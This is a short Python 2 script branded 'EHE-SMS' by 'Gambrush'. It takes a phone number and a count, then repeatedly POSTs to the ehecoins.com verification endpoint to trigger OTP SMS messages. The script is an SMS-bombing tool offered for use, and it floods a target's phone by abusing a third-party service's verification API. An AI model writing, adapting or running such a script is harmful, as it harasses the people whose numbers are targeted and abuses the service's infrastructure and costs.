import requests
import json
print '''[0;1;35;95m+-[0;1;31;91m+-[0;1;33;93m+-[0;1;32;92m+-[0;1;36;96m+-[0;1;34;94m+-[0;1;35;95m+-[0;1;31;91m+[0m [0;1;31;91m 2k19 Beta Version
[0;1;35;95m|E[0;1;31;91m|H[0;1;33;93m|E[0;1;32;92m|-[0;1;36;96m|S[0;1;34;94m|M[0;1;35;95m|S[0;1;31;91m|[0m [0;1;31;91m Coded By Gambrush
[0;1;35;95m+-[0;1;31;91m+-[0;1;33;93m+-[0;1;32;92m+-[0;1;36;96m+-[0;1;34;94m+-[0;1;35;95m+-[0;1;31;91m+[0m [0;1;31;91m @Copyright Reserved
[0;1;35;95mUs[0;1;31;91me:[0m [0;1;33;93m6[0;1;32;92m28[0;1;36;96mxx[0m
''' 
a = raw_input("[0;1;36;96mNomer Hp : ")
b = input("[0;1;36;96mJumlah : ")
for jmlh in range(0, b):
	str(a)
	jml = str(jmlh)
	c = requests.post('https://www.ehecoins.com/api/auth/askVerification', data={"username":a,"authtoken":"1234","language":"en"}).text
	jesen = json.loads(c)
	respon = jesen['status']['success']
	if respon == 1:
		print '[0;1;36;96m%s. %s Berhasil' % (jml, a)
	else:
		print '[0;1;36;96m%s. %s Gagal' % (jml, a)
